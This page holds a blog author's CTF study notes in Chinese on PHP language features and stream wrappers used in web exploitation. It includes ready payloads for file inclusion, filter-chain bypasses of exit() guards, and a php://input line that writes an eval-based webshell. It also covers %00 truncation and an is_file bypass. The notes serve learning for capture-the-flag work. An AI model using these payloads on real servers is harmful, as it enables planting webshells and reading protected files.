+<li><p>正数和0，原码＝反码＝补码；负数，原码＝(各位取反)反码＝(各位取反+1或者反码+1)补码</p>
+</li>
+<li><p>正数取反（以2为例）：</p>
+<ul>
+<li>2的32位原码为 0000 0000 0000 0000 0000 0000 0000 0010</li>
+<li>按位取反后为 1111 1111 1111 1111 1111 1111 1111 1101</li>
+<li>由于最前面的数为1，符号位为1，即为负数，所以，以其正值的补码形式表示为（符号位不变，按位取反，末尾加1）：1000 0000 0000 0000 0000 0000 0000 0011，所以输出为-3</li>
+</ul>
+</li>
+<li><p>负数取反（以-5为例）：</p>
+<ul>
+<li>-5原码：10000000 00000000 00000000 00000101</li>
+<li>-5反码：11111111 11111111 11111111 11111010(符号位不变，其它位取反)</li>
+<li>-5补码：11111111 11111111 11111111 11111011(在反码上+1)</li>
+<li>取反结果：00000000 00000000 00000000 00000100，化为十进制就是4</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>&lt;&lt; 左移运算的实质是将对应的数据的二进制值逐位左移若干位，并在空出的位置上填0，最高位溢出并舍弃；&gt;&gt;右移一位，和&lt;&lt;运算符类似</p>
+</li>
+<li><p>位运算符也有优先级：<code>~ &amp; ^ |</code> （顺序从高到低）</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.precedence.php">PHP运算符优先级总结</a></p>
+</li>
+</ul>
+<h3 id="ReflectionClass反射类"><a href="#ReflectionClass反射类" class="headerlink" title="ReflectionClass反射类"></a>ReflectionClass反射类</h3><ul>
+<li>ReflectionClass 反射类在PHP5新加入，继承自Reflector，它可以与已定义的类建立映射关系，通过反射类可以对类操作</li>
+<li>php反射类，可以理解为一个类的映射</li>
+<li>反射类不仅仅可以建立对类的映射，也可以建立对PHP基本方法的映射，并且返回基本方法执行的情况，因此可以通过建立反射类<code>new ReflectionClass(system(&#39;cmd&#39;))</code>来执行命令</li>
+</ul>
+<h3 id="call-user-func（-array）回调函数"><a href="#call-user-func（-array）回调函数" class="headerlink" title="call_user_func（_array）回调函数"></a>call_user_func（_array）回调函数</h3><p><a href="D:\phpstudy_pro\WWW\PHP\TEST1\test6.php">举例</a></p>
+<ul>
+<li>php系统调用用户自定义的函数,必须要通过一个代理函数来调用,叫间接调用,也叫回调</li>
+<li>call_user_func函数类似于一种特别的调用函数的方法，可以代替系统来调用我们自定义的函数</li>
+<li>call_user_func_array函数和call_user_func很相似，只不过是换了一种方式传递了参数，让参数的结构更清晰</li>
+<li>call_user_func_array函数与call_user_func不同的是，call_user_func_array是利用回调函数处理数组</li>
+<li>call_user_func函数和call_user_func_array函数都支持引用，这让他们和普通的函数调用更趋于功能一致：</li>
+<li>call_user_func调用的回调函数不仅仅是我们自定义的函数，还可以是php处理字符串的系统函数，传递的参数必须符合系统函数的传参顺序</li>
+<li>回调函数是匿名函数，并且匿名函数不设参数，可以通过其他方式获取参数</li>
+</ul>
+<p><strong>关于匿名函数</strong></p>
+<ul>
+<li>匿名函数和普通函数是非常相似的，它可以有返回值，也可以接受参数，不同的是匿名函数会在声明时省略函数名</li>
+</ul>
+<h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">php伪协议详解</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.expect.php">php伪协议超全</a></p>
+<p><strong>file://</strong></p>
+<ul>
+<li>作用：访问路径——绝对路径、相对路径、网络路径，且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响</li>
+<li>例如：<code>?file=file://D:\phpStudy\WWW\phpinfo.txt</code>|<code>?file=./phpinfo.txt</code>|<code>?file=http://127.0.0.1/phpinfo.txt</code></li>
+</ul>
+<p><strong>php://</strong></p>
+<ul>
+<li><p>作用：访问输入输出流</p>
+</li>
+<li><p><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用，这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器</p>
+<ul>
+<li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>（针对php文件需要base64编码）——读取php文件并进行base64编码输出</p>
+</li>
+<li><p>参数：</p>
+<ul>
+<li><p>resource=&lt;要过滤的数据流&gt; 这个参数是必须的，它指定了你要筛选过滤的数据流</p>
+</li>
+<li><p>read=&lt;读链的筛选列表&gt; 该参数可选，可以设定一个或多个过滤器名称，以管道符<code>|</code>分隔。</p>
+</li>
+<li><p>write=&lt;写链的筛选列表&gt; 该参数可选，可以设定一个或多个过滤器名称，以管道符<code>|</code>分隔。</p>
+</li>
+<li><p>&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链</p>
+<table>
+<thead>
+<tr>
+<th align="center">类型</th>
+<th align="center">过滤器名称</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">字符串过滤器</td>
+<td align="center">string.rot13</td>
+<td align="center">等同于str_rot13()，rot13变换</td>
+</tr>
+<tr>
+<td align="center">字符串过滤器</td>
+<td align="center">string.toupper</td>
+<td align="center">等同于strtoupper()，转大写字母</td>
+</tr>
+<tr>
+<td align="center">字符串过滤器</td>
+<td align="center">string.tolower</td>
+<td align="center">等同于strtolower()，转小写字母</td>
+</tr>
+<tr>
+<td align="center">字符串过滤器</td>
+<td align="center">string.strip_tags</td>
+<td align="center">等同于strip_tags()，去除html、PHP语言标签</td>
+</tr>
+<tr>
+<td align="center">转换过滤器</td>
+<td align="center">convert.base64-encode &amp; convert.base64-decode</td>
+<td align="center">等同于base64_encode()和base64_decode()，base64编码解码</td>
+</tr>
+<tr>
+<td align="center">转换过滤器</td>
+<td align="center">convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
+<td align="center">quoted-printable 字符串与 8-bit 字符串编码解码</td>
+</tr>
+<tr>
+<td align="center">压缩过滤器</td>
+<td align="center">zlib.deflate &amp; zlib.inflate</td>
+<td align="center">在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息，只是压缩和解压数据流中的有效载荷部分</td>
+</tr>
+<tr>
+<td align="center">压缩过滤器</td>
+<td align="center">bzip2.compress &amp; bzip2.decompress</td>
+<td align="center">同上，在本地文件系统中创建 bz2 兼容文件的方法</td>
+</tr>
+<tr>
+<td align="center">加密过滤器</td>
+<td align="center">mcrypt.*</td>
+<td align="center">libmcrypt 对称加密算法</td>
+</tr>
+<tr>
+<td align="center">加密过滤器</td>
+<td align="center">mdecrypt.*</td>
+<td align="center">libmcrypt 对称解密算法</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><code>php://input</code></p>
+<ul>
+<li>作用：执行POST数据中的php代码</li>
+<li>示例：<code>http://127.0.0.1/cmd.php?cmd=php://input</code>–POST数据：<code>&lt;?php phpinfo()?&gt;</code></li>
+<li>若有写入权限，则<code>&lt;?php fputs(fopen(&#39;1.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[1]); ?&gt;&#39;); ?&gt;</code></li>
+<li>注意：<code>enctype=&quot;multipart/form-data&quot;</code> 的时候 <code>php://input</code> 是无效的</li>
+</ul>
+</li>
+<li><p><strong>filter协议的进阶利用</strong>：利用filter伪协议绕过死亡之die和exit</p>
+<ul>
+<li><p>使用base64编码绕过</p>
+<ul>
+<li>最常见的方法是使用base64的方法将content解码后传入</li>
+<li>base64编码中只包含64个可打印字符，而当PHP在解码base64时，遇到不在其中的字符时，会选择跳过这些字符，将有效的字符重新组成字符串进行解码</li>
+<li>不仅我们的加密后的一句话木马进行base64解码，前面的死亡之exit也进行解码</li>
+<li>由于死亡之exit中的代码，字符<code>&lt;、?、;、&gt;、</code>空格等字符不符合base64解码范围，最终解码符合要求的只有<code>phpexit</code>这7个字符，而base64在解码的时候，是4个字节一组，因此还少一个，所以我们将这一个手动添加上去</li>
+</ul>
+</li>
+<li><p>使用rot13编码绕过</p>
+<ul>
+<li>相比base64编码，rot13的绕过死亡之exit更加方便，因为不用考虑前面添加的内容是否可以用base64解码，也不需要计算可base64解码的字符数量</li>
+<li>虽然rot13更加的方便，但是还是有缺点，就是当服务器开启了短标签解析，一句话木马即使写入了，也不会被PHP解析</li>
+</ul>
+</li>
+<li><p>多种过滤器绕过</p>
+<ul>
+<li>再仔细观察死亡之exit的代码：<code>&lt;?php exit; ?&gt;</code>可以看到死亡之exit的代码其实本质上是XML标签因此我们可以使用strip_tags函数除去该XML标签</li>
+<li><code>payload: ?filename=php://filter/string.strip_tags|convert.base64-decode/resource=1.php &amp;&amp; POSTDATA: content=PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>配合file_put_contents( v3,str);函数 //在需要base64转换的时候</p>
+</li>
+<li><p>写文件：v3=php://filter/write=convert.base64-decode/resource=1.php&amp;str=”aaaa”</p>
+</li>
+</ul>
+<h5 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h5><ul>
+<li>作用：自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据，通常可以用来执行PHP代码，一般需要用到base64编码传输</li>
+<li>例如：<code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code>——<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12285202.html">zjctf一道例题</a></li>
+<li><code>?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></li>
+</ul>
+<h5 id="zlib-amp-bzip2-amp-zlib"><a href="#zlib-amp-bzip2-amp-zlib" class="headerlink" title="zlib://&amp;bzip2://&amp;zlib://"></a>zlib://&amp;bzip2://&amp;zlib://</h5><ul>
+<li><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等</li>
+<li>示例：<ul>
+<li><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23），压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传——<code>?file=zip://D:\phpstudy_pro\WWW\PHP\TEST2\a.zip%23aa.txt</code></li>
+<li>compress.bzip2://file.bz2，压缩phpinfo.txt为phpinfo.bz2并上传(同样支持任意后缀名)——?file=compress.bzip2://D:\phpstudy_pro\WWW\PHP\TEST2\aa.bz2</li>
+<li>compress.zlib://file.gz，压缩 phpinfo.txt 为 phpinfo.gz 并上传(同样支持任意后缀名)——?file=compress.zlib://D:\phpstudy_pro\WWW\PHP\TEST2\a.gz</li>
+</ul>
+</li>
+</ul>
+<h5 id="http-amp-https"><a href="#http-amp-https" class="headerlink" title="http:// &amp; https://"></a>http:// &amp; https://</h5><ul>
+<li>常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源，CTF中通常用于远程包含</li>
+<li>例如：<code>?file=http://127.0.0.1/phpinfo.txt</code></li>
+</ul>
+<h5 id="ftp"><a href="#ftp" class="headerlink" title="ftp://"></a>ftp://</h5><ul>
+<li>允许通过 FTP 读取存在的文件，以及创建新文件；如果服务器不支持被动（passive）模式的 FTP，连接会失败</li>
+<li>用法：<ul>
+<li><code>ftp://example.com/pub/file.txt</code></li>
+<li><code>ftp://user:password@example.com/pub/file.txt</code></li>
+<li><code>ftps://example.com/pub/file.txt</code></li>
+<li><code>ftps://user:password@example.com/pub/file.txt</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="glob"><a href="#glob" class="headerlink" title="glob://"></a>glob://</h5><ul>
+<li>glob://  查找匹配的文件路径模式</li>
+<li>glob: 数据流包装器</li>
+<li>用法：glob://</li>
+</ul>
+<h5 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h5><ul>
+<li><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容</li>
+<li>例如：<code>?file=phar://D:/phpStudy/WWW/phpinfo.zip/phpinfo.txt</code></li>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">phar://协议对象注入技术</a></li>
+</ul>
+<h5 id="ssh2"><a href="#ssh2" class="headerlink" title="ssh2://"></a>ssh2://</h5><ul>
+<li>ssh2:// — 安全外壳协议 2</li>
+<li>用法<ul>
+<li><code>ssh2.shell://user:pass@example.com:22/xterm</code></li>
+<li><code>ssh2.exec://user:pass@example.com:22/usr/local/bin/somecmd</code></li>
+<li><code>ssh2.tunnel://user:pass@example.com:22/192.168.0.1:14</code></li>
+<li><code>ssh2.sftp://user:pass@example.com:22/path/to/filename</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="rar"><a href="#rar" class="headerlink" title="rar://"></a>rar://</h5><ul>
+<li>封装协议采用 url 编码，（相对/绝对）路径的 RAR 归档、一个可选的星号（<code>*</code>）、一个可选的井号（<code>#</code> ）和一个可选的存储在归档中的 url 编码条目名称，指定条目名称必须带有井号，条目名称开头的斜线是可选的</li>
+<li>该封装协议可以打开文件和目录。当打开目录时，星号会强制返回未编码的目录条目名称，如果不指定星号，将返回 URL 编码的目录条目名称 </li>
+<li>用法：<code>rar://&lt;url encoded archive name&gt;[*][#[]]</code></li>
+</ul>
+<h5 id="ogg"><a href="#ogg" class="headerlink" title="ogg://"></a>ogg://</h5><ul>
+<li>ogg:// — 音频流</li>
+<li>通过包装器 ogg:// 读取的文件， 是作为 <code>OGG/Vorbis</code> 格式的压缩音频编码， 同样，通过包装器 ogg:// 写入或追加的数据格式也是压缩音频</li>
+<li>用法：<ul>
+<li><code>ogg://soundfile.ogg</code></li>
+<li><code>ogg:///path/to/soundfile.ogg</code></li>
+<li><code>ogg://http://www.example.com/path/to/soundstream.ogg</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="expect"><a href="#expect" class="headerlink" title="expect://"></a>expect://</h5><ul>
+<li>expect:// — 处理交互式的流</li>
+<li>由 expect:// 封装协议打开的数据流 PTY 通过提供了对进程 stdio、stdout 和 stderr 的访问</li>
+<li>用法：<code>expect://command</code></li>
+</ul>
+<h3 id="is-file-函数"><a href="#is-file-函数" class="headerlink" title="is_file()函数"></a>is_file()函数</h3><p>判断是否为文件</p>
+<p><strong>php伪协议绕过：</strong></p>
+<ul>
+<li>highlight_file()可以识别php伪协议 is_file()不能识别php伪协议</li>
+<li>is_file判断给定文件名是否为一个正常的文件，返回值为布尔类型，is_file会认为php伪协议不是文件，但highlight_file认为伪协议可以是文件</li>
+<li>若有过滤，可以换其他伪协议或改编码方式</li>
+</ul>
+<p><strong>/proc/self/root：</strong>在linux中/proc/self/root是指向根目录的 也就是如果在命令行中输入 ls /proc/self/root，其实显示的内容是根目录下的内容，多次重复后绕过is_file </p>
+<pre><code class="http">file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
+</code></pre>
+<h3 id="parse-str-函数"><a href="#parse-str-函数" class="headerlink" title="parse_str()函数"></a>parse_str()函数</h3><ul>
+<li>把查询字符串解析到变量中，语法：<code>parse_str(string,array)</code></li>
+<li>参数：string 必需，规定要解析的字符串；array 可选，规定存储变量的数组名称，该参数指示变量存储到数组中</li>
+<li>如果未设置array参数，则由该函数设置的变量将覆盖已存在的同名变量</li>
+</ul>
+<h3 id="ereg-截断漏洞"><a href="#ereg-截断漏洞" class="headerlink" title="ereg()截断漏洞"></a>ereg()截断漏洞</h3><ul>
+<li><code>ereg()</code>函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回<code>true</code>，否则返回<code>false</code>，搜索对于字母字符是区分大小写的</li>
+<li>函数原型<code>int ereg(string pattern, string originalstring, [array regs])</code> </li>
+<li>可选的输入参数<code>regs</code>包含由正则表达式中的括号组成的所有匹配表达式的数组</li>
+<li>如果有找到模式匹配，则返回<code>true</code>，否则返回<code>false</code></li>
+<li><code>ereg()</code>函数存在NULL截断漏洞，当传入的字符串包含%00时，只有%00前的字符串会传入函数并执行，而后半部分不会传入函数判断。因此可以使用%00截断，连接非法字符串，从而绕过函数</li>
+</ul>
+<h3 id="strrev"><a href="#strrev" class="headerlink" title="strrev()"></a>strrev()</h3><ul>
+<li>反转字符串，常出现在%00截断漏洞中</li>
+<li>注：%00是一个整体，不会反转成00%</li>
+</ul>
+<h3 id="Exception-异常处理类"><a href="#Exception-异常处理类" class="headerlink" title="Exception 异常处理类"></a>Exception 异常处理类</h3><ul>
+<li>PHP 异常处理与Java相似，都使用try、throw、catch语句，发生异常时代码。如果异常没有被捕获，而且又没用使用 <code>set_exception_handler()</code> 作相应的处理的话，那么将发生一个严重的错误（致命错误），并且输出 “Uncaught Exception” （未捕获异常）的错误消息</li>
+<li>try：用于可能发生异常的代码块</li>
+<li>throw：规定如何触发（trigger）异常，用于抛出异常，每一个throw必须对应至少一个catch</li>
+<li>catch：捕获异常，并创建包含异常信息的对象</li>
+</ul>
+<h3 id="FilesystemIterator类读取文件"><a href="#FilesystemIterator类读取文件" class="headerlink" title="FilesystemIterator类读取文件"></a>FilesystemIterator类读取文件</h3><ul>
+<li>FilesystemIterator获取指定目录下的所有文件</li>
+<li>getcwd()函数：获取当前工作目录 返回当前工作目录</li>
+</ul>
+<h3 id="php变量"><a href="#php变量" class="headerlink" title="php变量"></a>php变量</h3><ul>
+<li><p>$GLOBALS是一个PHP超级全局变量，用于从PHP脚本中的任何位置访问全局变量（也可以从函数或方法内部）</p>
+</li>
+<li><p>构造出<code>var_dump($GLOBALS);</code>可以输出全部变量值，包括自定义</p>
+</li>
+<li><p><strong>PHP双$（$$）的变量覆盖</strong>：在双写$的时候，属于动态变量，就是后面的变量值作为新的变量名</p>
+</li>
+</ul>
+<h3 id="return绕过"><a href="#return绕过" class="headerlink" title="return绕过"></a>return绕过</h3><p><code>eval(&quot;return 1;phpinfo();&quot;);</code>会发现是无法执行phpinfo()的</p>
+<p>但是php中数字是可以和命令进行一些运算的，例如 <code>1-phpinfo();</code>是可以执行phpinfo()命令的</p>
+<p>链接们：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/murkuo/p/15388795.html">PHP特性总结 </a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45086218/article/details/114113971">CTF中的PHP特性</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/231507">https://www.anquanke.com/post/id/231507</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.manongjc.com/detail/25-eevmbsiswtilhui.html">http://www.manongjc.com/detail/25-eevmbsiswtilhui.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.haodaquan.com/12">http://www.haodaquan.com/12</a></p>
+
+    </div>
+
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2022 - 2022 Hoylindo
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @hoylindo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+</body>
+
+</html>
